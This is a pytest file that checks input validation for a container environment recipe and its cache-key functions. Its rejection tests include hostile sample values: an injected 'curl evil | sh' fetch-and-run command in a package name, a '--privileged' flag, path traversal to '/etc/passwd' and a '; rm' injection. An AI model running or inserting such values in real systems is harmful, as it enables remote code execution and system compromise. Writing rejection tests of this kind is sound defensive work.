from __future__ import annotations

from typing import Any

import pytest
from pydantic import ValidationError

from autocontribute.environments import (
    EnvironmentRecipe,
    dependency_digest,
    environment_cache_key,
)

_DIGEST = "sha256:" + "a" * 64
_DEPENDENCIES = "b" * 64


def _recipe(**changes: Any) -> EnvironmentRecipe:
    fields: dict[str, Any] = {
        "repository": "acme/demo",
        "language": "python",
        "base_image": "python:3.13-bookworm",
        "system_packages": ["git", "less"],
        "setup_commands": ["uv sync --locked"],
        "build_commands": [],
        "test_command": "python -m pytest",
        "test_framework": "pytest",
        "test_report": "/tmp/ac-report.xml",
        "env": {"PATH": "/opt/ac/venv/bin:/usr/bin:/bin"},
        "offline_env": {"UV_OFFLINE": "1"},
        "fetch_tags": False,
        "fetch_submodules": False,
        "source": "detected",
        "dependency_digest": _DEPENDENCIES,
    }
    return EnvironmentRecipe.model_validate({**fields, **changes})


def test_recipe_round_trips_through_json_with_defaults_for_setup_results() -> None:
    recipe = _recipe()

    assert recipe.targeted is False
    assert recipe.setup_dirty_paths == []
    assert EnvironmentRecipe.model_validate_json(recipe.model_dump_json()) == recipe


@pytest.mark.parametrize(
    "changes",
    [
        {"repository": "not a repository"},
        {"base_image": "--privileged"},
        {"base_image": "python:3.13 bookworm"},
        {"system_packages": ["git; curl evil | sh"]},
        {"setup_commands": ["   "]},
        {"test_command": "pytest\0"},
        {"env": {"BAD-NAME": "1"}},
        {"offline_env": {"NAME": "nul\0"}},
        {"setup_dirty_paths": ["../outside"]},
        {"setup_dirty_paths": ["/etc/passwd"]},
        {"dependency_digest": "sha256:" + "b" * 64},
        {"test_framework": "nose"},
        {"unexpected": True},
    ],
)
def test_recipe_rejects_values_a_container_command_could_misread(changes: dict[str, Any]) -> None:
    with pytest.raises(ValidationError):
        _recipe(**changes)


def test_dependency_digest_ignores_listing_order() -> None:
    files = [("pyproject.toml", "1" * 40), ("uv.lock", "2" * 40)]

    assert dependency_digest(files) == dependency_digest(list(reversed(files)))
    assert dependency_digest(files) != dependency_digest(files[:1])


def test_cache_key_changes_with_every_input() -> None:
    base = {
        "language": "python",
        "arch": "linux/amd64",
        "base_image_digest": _DIGEST,
        "dependency_digest": _DEPENDENCIES,
    }
    variants = [
        {"language": "rust"},
        {"arch": "linux/arm64"},
        {"base_image_digest": "sha256:" + "c" * 64},
        {"dependency_digest": "d" * 64},
    ]

    key = environment_cache_key(**base)  # type: ignore[arg-type]

    assert key == environment_cache_key(**base)  # type: ignore[arg-type]
    assert len(key) == 64
    assert all(
        environment_cache_key(**{**base, **variant}) != key  # type: ignore[arg-type]
        for variant in variants
    )


@pytest.mark.parametrize(
    ("arch", "base_image_digest", "digest"),
    [
        ("linux/amd64; rm", _DIGEST, _DEPENDENCIES),
        ("linux/amd64", "python:3.13", _DEPENDENCIES),
        ("linux/amd64", _DIGEST, "not-a-digest"),
    ],
)
def test_cache_key_rejects_malformed_inputs(arch: str, base_image_digest: str, digest: str) -> None:
    with pytest.raises(ValueError):
        environment_cache_key(
            language="python",
            arch=arch,
            base_image_digest=base_image_digest,
            dependency_digest=digest,
        )
